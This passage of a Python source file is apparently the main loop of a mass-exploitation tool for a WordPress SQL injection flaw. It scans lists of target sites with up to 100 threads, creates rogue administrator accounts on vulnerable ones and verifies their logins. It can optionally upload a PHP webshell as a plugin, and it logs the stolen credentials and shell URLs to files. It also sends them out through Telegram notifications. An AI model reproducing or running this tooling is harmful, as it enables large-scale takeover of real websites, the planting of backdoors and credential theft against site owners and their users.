        vlog("checking route confusion...", "*")
        conf_ok = client.confusion(fast=not is_single)
        if conf_ok:
            vlog("route confusion OK", "*")
        else:
            vlog("confusion soft-fail — probing SQLi", "!")

        vlog("probing SQLi...", "*")
        t_sqli = time.time()
        extractor = None
        try:
            extractor = select_extractor(client)
        except Exception:
            extractor = None
        if extractor is None:
            vlog(f"no SQLi ({time.time()-t_sqli:.1f}s)", "!")
            return None
        vlog(f"SQLi OK ({time.time()-t_sqli:.1f}s) [{client.sink_info()}|{getattr(extractor, 'technique', '?')}]", "+")

        with stats_lock:
            total_vuln += 1
        conf_tag = "conf" if conf_ok else "sqli-only"
        log(f"[{idx}/{total}] {target} -> VULNERABLE ({ver_str}) [{client.sink_info()}|{conf_tag}]", "v")
        save_vulnerable(target)

        try:
            creator = AdminCreator(target, c, rr=client.rr)
            for attr in ("_blind_sink", "_union_sink", "_write_sink", "_comment", "_primer",
                         "_time_mode", "_time_sleep"):
                setattr(creator.client, attr, getattr(client, attr, None))
                setattr(creator._render_client, attr, getattr(client, attr, None))

            shell_file = getattr(args, "shell_file", None)
            shell_url = None

            try:
                adm = creator.create(quiet=not is_single)
            except Exception as e:
                # Soft network/DNS during create — don't count as hard FAIL spam
                if AdminCreator._is_dns_err(e):
                    log(f"SKIP {target} -> DNS/network during create", "!")
                    return None
                raise
            log(f"CREATED {target} -> {adm.username}/{adm.password}", "*")

            verify = not getattr(args, "no_verify", False)
            want_update = not getattr(args, "no_core_update", False)
            login_ok = True
            login_diag = ""
            verifier = None
            if verify or shell_file or want_update:
                time.sleep(0.25)
                verifier = LoginVerifier(target, c)
                try:
                    # Use SQLi-discovered hide-login slug when extractor is available
                    src = getattr(creator, "_src", None)
                    if src is not None:
                        pfx = getattr(creator, "_base_prefix", None) or "wp_"
                        login_ok = verifier.login_with_hints(
                            adm.username, adm.password, src=src, prefix=pfx)
                    else:
                        login_ok = verifier.login(adm.username, adm.password)
                except Exception as e:
                    if AdminCreator._is_dns_err(e):
                        log(f"WARN {target} -> DNS after create (creds may still work)", "!")
                        login_ok = False
                        login_diag = "dns"
                    else:
                        raise
                else:
                    login_diag = verifier.last_reason or ""
                if login_ok and verifier.login_url:
                    vlog(f"login via {verifier.login_url}", "*")

            if shell_file and login_ok:
                shell_url = self_deploy_shell(
                    target, c, shell_file, verifier=verifier, adm=adm,
                )
            elif shell_file and not login_ok:
                vlog("shell skipped — login failed", "!")

            update_info = None
            if login_ok and verifier is not None and want_update:
                def _run_core_update():
                    upd = CoreUpdater.from_verifier(verifier)
                    return upd.maybe_update(min_ver=_UPDATE_MIN)

                if is_single:
                    vlog("checking core version / update...", "*")
                    try:
                        update_info = _run_core_update()
                        if update_info.get("updated"):
                            log(
                                f"UPDATED {target} -> core "
                                f"{_ver_str(update_info.get('version_before'))} → "
                                f"{_ver_str(update_info.get('version_after'))}",
                                "+",
                            )
                        else:
                            log(
                                f"CORE SKIP {target} -> "
                                f"{_ver_str(update_info.get('version_before') or update_info.get('version'))} "
                                f"| {update_info.get('reason', '-')}",
                                "!",
                            )
                    except Exception as e:
                        log(f"CORE FAIL {target} -> {type(e).__name__}: {e}", "!")
                        update_info = {"updated": False, "reason": str(e)}
                else:
                    def _bg_update(v=verifier, t=target):
                        try:
                            upd = CoreUpdater.from_verifier(v)
                            info = upd.maybe_update(min_ver=_UPDATE_MIN)
                            if info.get("updated"):
                                log(
                                    f"UPDATED {t} -> core "
                                    f"{_ver_str(info.get('version_before'))} → "
                                    f"{_ver_str(info.get('version_after'))}",
                                    "+",
                                )
                            else:
                                log(
                                    f"CORE SKIP {t} -> "
                                    f"{_ver_str(info.get('version_before') or info.get('version'))} "
                                    f"| {info.get('reason', '-')}",
                                    "!",
                                )
                        except Exception as e:
                            log(f"CORE FAIL {t} -> {e}", "!")
                    threading.Thread(target=_bg_update, daemon=True).start()
                    update_info = {"async": True, "reason": "started"}

            if verify and not login_ok:
                why = f" [{login_diag}]" if login_diag else ""
                log(f"WARN {target} -> LOGIN FAILED{why}", "!")
                save_admin_creds(target, adm.username, adm.password, adm.email,
                                 verified=False, shell_url=shell_url)
                with stats_lock:
                    total_fail += 1
                return {"target": target, "success": False,
                        "error": f"login failed{why}".strip(), "shell": shell_url}

            log(f"SUCCESS {target} -> {adm.username}/{adm.password}", "+")
            save_admin_creds(target, adm.username, adm.password, adm.email,
                             verified=True, shell_url=shell_url)
            with stats_lock:
                total_success += 1

            login_url = (verifier.login_url if verifier and verifier.login_url
                         else f"{target.rstrip('/')}/wp-login.php")
            notify_telegram(target, adm.username, adm.password, adm.email,
                            shell_url=shell_url, login_url=login_url,
                            update_info=update_info)

            return {"target": target, "success": True, "username": adm.username,
                    "password": adm.password, "email": adm.email, "shell": shell_url}
        except Exception as e:
            err = str(e)
            # Classify: DNS/network = soft skip (not real exploit fail)
            if AdminCreator._is_dns_err(e) or "Temporary failure" in err or "urlopen error" in err:
                if is_single:
                    log(f"SKIP {target} -> network/DNS", "!")
                return None
            short = err[:70]
            # Quiet common expected create failures in mass mode
            soft = (
                "oEmbed backing" in err
                or "could not recover" in err
                or "bad posts table" in err
                or "user write did not persist" in err
                or "could not find administrator" in err
            )
            if soft and not is_single:
                log(f"FAIL {target} -> {short}", "-")
            else:
                log(f"FAIL {target} -> {short}", "-")
            with stats_lock:
                total_fail += 1
            return {"target": target, "success": False, "error": short}

    except Exception as e:
        if AdminCreator._is_dns_err(e):
            return None
        if is_single:
            log(f"SKIP {target} -> {type(e).__name__}: {str(e)[:60]}", "!")
        return None

def load_targets(arg):
    targets=[]
    def fix(u):
        u=u.strip()
        if not u or u.startswith("#"): return None
        return u if u.lower().startswith(("http://","https://")) else "https://"+u
    if arg.lower().startswith(("http://","https://")): return [arg]
    if os.path.isfile(arg):
        with open(arg, encoding='utf-8', errors='ignore') as f:
            for l in f:
                fixed=fix(l)
                if fixed: targets.append(fixed)
        return targets
    fixed=fix(arg)
    return [fixed] if fixed else []

def main():
    p = argparse.ArgumentParser(
        description="Streaming Scanner + Admin Creator for CVE-2026-63030"
    )
    p.add_argument("-l","--list", help="file with target URLs (one per line)")
    p.add_argument("-u","--url", help="single target URL")
    p.add_argument("--threads", type=int, default=40, help="parallel workers (default: 40; use 1 or --sequential for ordered)")
    p.add_argument("--sequential", action="store_true",
                   help="process targets one-by-one in list order (same as --threads 1)")
    p.add_argument("--timeout", type=float, default=10, help="request timeout (default: 10)")
    p.add_argument("--insecure", action=argparse.BooleanOptionalAction, default=True,
                   help="skip TLS verification (use --no-insecure to enable verification)")
    p.add_argument("--proxy", help="HTTP proxy")
    p.add_argument("--delay", type=float, default=0, help="delay between requests")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--no-verify", action="store_true",
                   help="skip login verification (WARNING: may report false positives)")
    p.add_argument("--shell-file", metavar="PATH",
                   help="custom PHP webshell; upload as WP plugin after admin login")
    p.add_argument("--no-core-update", action="store_true",
                   help="skip auto core update when WP version < 7.0.2 (default: update)")
    p.add_argument("--tg-token", help="Telegram bot token for notifications")
    p.add_argument("--tg-chat", help="Telegram chat ID for notifications")
    args = p.parse_args()

    if not args.list and not args.url:
        p.error("one of -l/--list or -u/--url is required")

    global _COLOR, TELEGRAM_TOKEN, TELEGRAM_CHAT_ID
    _COLOR = not args.no_color

    TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN") or args.tg_token
    TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID") or args.tg_chat
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        log("Telegram notifications enabled", "+")
    else:
        log("Telegram notifications disabled (provide --tg-token and --tg-chat or set env vars)", "*")

    if args.shell_file:
        if not os.path.isfile(args.shell_file):
            log(f"shell file not found: {args.shell_file}", "-")
            return
        log(f"Shell deploy enabled: {args.shell_file}", "+")

    print(BANNER)

    with open("vulnerable_live.txt", "w") as f:
        f.write("# Live Vulnerable Targets\n")
        f.write(f"# Start time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("# " + "="*60 + "\n\n")

    with open("admin_creds_live.txt", "w") as f:
        f.write("# Live Admin Credentials\n")
        f.write(f"# Start time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("# " + "="*60 + "\n")
        f.write("# Format: TARGET|USERNAME:PASSWORD|EMAIL[|SHELL]\n")
        f.write("# " + "-"*60 + "\n\n")

    if args.shell_file:
        with open("shells_live.txt", "w") as f:
            f.write("# Deployed shells\n")
            f.write(f"# Start time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# Format: TARGET|SHELL_URL|USERNAME\n")
            f.write("# " + "-"*60 + "\n\n")

    c = Cfg(timeout=args.timeout, proxy=args.proxy, insecure=args.insecure, delay=args.delay)

    if args.url:
        targets = load_targets(args.url)
    else:
        targets = load_targets(args.list)
    if not targets:
        log("No targets found","-")
        return

    total = len(targets)
    is_single = total <= 1
    sequential = bool(getattr(args, "sequential", False) or args.threads <= 1)
    if sequential:
        args.threads = 1
        log(f"Loaded {total} target(s). Mode: SEQUENTIAL (1 by 1, list order)", "*")
    else:
        log(f"Loaded {total} target(s). Scanning with {args.threads} threads (parallel, unordered finish)...", "*")
    if args.shell_file:
        flow = "Create → Login → Shell → Core Update (async)"
    else:
        flow = "Create → Login → Core Update (async)"
    log(f"Streaming: {flow}", "+")
    if not is_single and not sequential:
        log("Mode: mass parallel (minimal log)", "*")
    print()

    done_count = 0
    if sequential:
        # Ordered: target[0], target[1], ... — no thread pool race
        for i, t in enumerate(targets, 1):
            try:
                process_target(t, c, args, i, total)
            except Exception as e:
                log(f"Worker error: {type(e).__name__}: {e}", "!")
            done_count += 1
            if not is_single and done_count % 50 == 0 and done_count < total:
                with stats_lock:
                    v, s, f = total_vuln, total_success, total_fail
                log(f"  [{done_count}/{total}] vuln={v} ok={s} fail={f}", "*")
    else:
        workers = max(1, min(args.threads, total, 100))
        # Bounded backlog: never materialize futures for the whole list.
        # Multi-million line lists stream through a window of
        # workers * _FUTURE_BACKLOG_FACTOR in-flight futures (RAM-safe).
        backlog = max(workers * _FUTURE_BACKLOG_FACTOR, workers)
        with ThreadPoolExecutor(max_workers=workers) as ex:
            pending = set()
            it = enumerate(targets, 1)

            def _drain(finished):
                nonlocal done_count
                for fut in finished:
                    done_count += 1
                    try:
                        fut.result()
                    except Exception as e:
                        log(f"Worker error: {type(e).__name__}: {e}", "!")
                if not is_single and done_count % 200 == 0 and done_count < total:
                    with stats_lock:
                        v, s, f = total_vuln, total_success, total_fail
                    log(f"  [{done_count}/{total}] vuln={v} ok={s} fail={f}", "*")

            # Prime the window
            for _ in range(backlog):
                try:
                    i, t = next(it)
                except StopIteration:
                    break
                pending.add(ex.submit(process_target, t, c, args, i, total))
            # Stream: as soon as one finishes, submit the next target
            while pending:
                finished, pending = wait(pending, return_when=FIRST_COMPLETED)
                _drain(finished)
                for _ in range(len(finished)):
                    try:
                        i, t = next(it)
                    except StopIteration:
                        break
                    pending.add(ex.submit(process_target, t, c, args, i, total))
    print()

    with stats_lock:
        vuln = total_vuln
        success = total_success
        fail = total_fail

    log("SCAN COMPLETE:", "+")
    log(f"  Vulnerable found: {vuln}", "+")
    log(f"  Admin created   : {success}", "+")
    log(f"  Failed          : {fail}", "-")
    outs = "vulnerable_live.txt, admin_creds_live.txt"
    if getattr(args, "shell_file", None):
        outs += ", shells_live.txt"
    log(f"  Results saved to: {outs}", "*")

    print()
    log("Done.","*")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        log("Interrupted by user", "-")
    except Exception as e:
        print()
        log(f"Fatal: {type(e).__name__}: {e}", "-")